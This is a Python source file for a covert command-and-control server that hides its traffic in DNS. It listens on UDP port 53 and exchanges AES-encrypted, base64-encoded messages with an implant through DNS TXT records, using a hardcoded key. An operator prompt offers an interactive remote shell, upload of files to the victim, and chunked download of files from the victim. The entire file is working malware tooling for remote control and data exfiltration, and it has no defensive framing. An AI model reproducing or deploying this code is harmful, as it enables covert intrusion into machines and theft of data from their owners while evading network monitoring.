import socket
import dnslib
from Crypto.Cipher import AES
import base64
import os
import binascii

class Server:
    def __init__(self,host,port):
        self.host=host
        self.port=port

    def connects(self):
        global s,address
        he = ['cmd--->命令行交互','upload--->文件上传','download--->文件下载','exit--->退出']
        hps={'cmd': self.cmd,'upload':self.upload,'download':self.download,'exit':exit}
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.bind((self.host,int(self.port)))
        data,address=s.recvfrom(1024)
        print('[+] 来源IP:{},来源端口:{}'.format(address[0],address[1]))
        dnsj=self.dnsj(data)
        demo=self.jiemi(dnsj[1])
        if demo:
            print('[+] {}:{}<---->{}:{}'.format(self.host,self.port,address[0],address[1]))
            print('+请执行你的操作，如果有问题请输入help')
            demos=self.jiami('demo')
            fs=self.dnsc(dnsj[0],demos)
            s.sendto(fs.pack(),address)
            while True:
                xw=input('Jarvis:')
                if xw in hps:
                    try:
                        hps[xw]()
                    except Exception as r:
                        print('-- Error:{}'.format(r))
                elif xw=='help':
                    print('')
                    for h in he:
                        print(h)
                else:
                    print('-没有这种操作')
                    continue

    def ok(self,value):
        jb,jc=s.recvfrom(1024)
        dnsj = self.dnsj(jb)
        demo = self.jiemi(dnsj[1])
        print(demo)
        if demo:
            demos = self.jiami(value)
            fs = self.dnsc(dnsj[0], demos)
            s.sendto(fs.pack(),jc)


    def dnsj(self,data):
        dr=dnslib.DNSRecord.parse(data)
        answer=dr.reply()
        return answer,dr.questions[0].qname.label[0]

    def dnsc(self,answer,data):
        answer.add_answer(*dnslib.RR.fromZone('{}.com 60 TXT'.format(data)))
        return answer

    def add_to_16(self,text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def jiami(self,data):
        key = 'DD194FB8BA97C8BFDA635E3CE76809A2'.encode('utf-8')
        text=bytes.decode(base64.b64encode(str(data).encode('utf-8')))
        aes = AES.new(key, AES.MODE_ECB)
        encrypd = str(base64.encodebytes(aes.encrypt(self.add_to_16(text))), encoding='utf-8').replace('\n', '')
        return encrypd

    def jiemi(self,data):
        key = 'DD194FB8BA97C8BFDA635E3CE76809A2'.encode('utf-8')
        aes=AES.new(key,AES.MODE_ECB)
        decode_encrypd = aes.decrypt(base64.decodebytes(data))
        return bytes.decode(base64.b64decode(bytes.decode(decode_encrypd).rstrip('\0')))

    def cmd(self):
        self.ok('cmd')
        while True:
            jb, jc = s.recvfrom(1024)
            dnsj = self.dnsj(jb)
            demo = self.jiemi(dnsj[1])
            if demo!='cmd' and demo !='long':
                print(demo)
                demos = self.jiami('cmd')
                fs = self.dnsc(dnsj[0], demos)
                s.sendto(fs.pack(), jc)
            elif demo=='long':
                changdu=0
                jg=b''
                demos = self.jiami('long')
                fs = self.dnsc(dnsj[0], demos)
                s.sendto(fs.pack(), jc)

                c,d= s.recvfrom(1024)
                dnsj = self.dnsj(c)
                demo=self.jiemi(dnsj[1])
                if str(demo).isdigit()==True:
                    changdu+=int(demo)
                print(changdu)
                demos = self.jiami('{}'.format(changdu))
                fs = self.dnsc(dnsj[0], demos)
                s.sendto(fs.pack(), d)
                while True:
                    d,e = s.recvfrom(1024)
                    dnsj = self.dnsj(d)
                    jg+=dnsj[1]
                    if len(jg)==changdu:
                        jmk=self.jiemi(jg)
                        print(jmk)
                        fs = self.dnsc(dnsj[0], 'break')
                        s.sendto(fs.pack(), e)
                        break
                    demos = self.jiami('jx')
                    fs = self.dnsc(dnsj[0], demos)
                    s.sendto(fs.pack(), e)

            else:
                shell=input('Jarvis_shell:')
                if shell=='exit':
                    demos = self.jiami('exit')
                    fs = self.dnsc(dnsj[0], demos)
                    s.sendto(fs.pack(), jc)
                    break
                demos = self.jiami(shell)
                fs = self.dnsc(dnsj[0], demos)
                s.sendto(fs.pack(), jc)




    def upload(self):
        self.ok('upload')
        js,jb=s.recvfrom(1024)
        jx=self.dnsj(js)
        if jx:
            changdu=0
            bp=input(r'+要上传的文件:')
            bt=input(r'+保存文件的位置')
            if os.path.exists(bp):
                dk=open(bp,'rb')
                jm=self.jiami(binascii.hexlify(dk.read()).decode('ascii'))
                changdu+=len(jm)
                cj=self.dnsc(jx[0],changdu)
                s.sendto(cj.pack(),jb)
                a = 0
                b = 32
                for i in jm:
                    jiaopi, jiaopo = s.recvfrom(1024)
                    cz = self.dnsj(jiaopi)
                    jms=self.jiemi(cz[1])
                    if jms=='break':
                        jd = self.dnsc(cz[0],'1')
                        s.sendto(jd.pack(), jiaopo)
                        break
                    jd=self.dnsc(cz[0],jm[a:b])
                    s.sendto(jd.pack(),jiaopo)
                    a+=32
                    b+=32

                fn,fb=s.recvfrom(1024)
                jr=self.dnsj(fn)
                jmp=self.jiemi(jr[1])
                if jmp:
                    jmq=self.jiami(bt)
                    cz=self.dnsc(jr[0],jmq)
                    s.sendto(cz.pack(),fb)

                    ig, iq= s.recvfrom(1024)
                    jg=self.dnsj(ig)
                    ora=self.jiemi(jg[1])
                    if ora=='cg':
                        print('+文件上传成功')
                        jms=self.jiami('1')
                        cz=self.dnsc(jg[0], jms)
                        s.sendto(cz.pack(), iq)
                    elif ora=='bcg':
                        print('-文件上传失败')
                        jms=self.jiami('0')
                        cz=self.dnsc(jg[0], jms)
                        s.sendto(cz.pack(), iq)
            else:
                print('-文件不存在')
                cj = self.dnsc(jx[0], 'fuck')
                s.sendto(cj.pack(), jb)




    def download(self):
        self.ok('download')
        js, jb = s.recvfrom(1024)
        jx = self.dnsj(js)
        chang=0
        data=b''
        if jx:
            xw=input('+要下载的目标文件路径:')
            jw=input('+保存文件的路径:')
            js=self.jiami(xw)
            print(js)
            cuan=self.dnsc(jx[0],js)
            s.sendto(cuan.pack(),jb)
            gs,gb=s.recvfrom(1024)
            gx=self.dnsj(gs)
            if gx[1]==b'bcz':
                print('-目标文件不存在')
                g=self.dnsc(gx[0],'0')
                s.sendto(g.pack(),gb)
            else:
                chang+=int(gx[1])
                g=self.dnsc(gx[0],'1')
                s.sendto(g.pack(),gb)
                while True:
                    jiaopi, jiaopo = s.recvfrom(1024)
                    jxcq=self.dnsj(jiaopi)
                    data+=jxcq[1]
                    if len(data) == chang:
                        cu = self.dnsc(jxcq[0], 'break')
                        s.sendto(cu.pack(), jiaopo)
                        break

                    cu=self.dnsc(jxcq[0],'0')
                    s.sendto(cu.pack(),jiaopo)

                xj=open(r'{}'.format(jw),'wb')
                xj.write(binascii.unhexlify(self.jiemi(data)))
                xj.close()

                if os.path.exists(r'{}'.format(jw)):
                    print('+文件下载成功')
                else:
                    print('-文件下载失败')





if __name__ == '__main__':
    host='192.168.3.75'
    port=53
    obj=Server(host,port)
    obj.connects()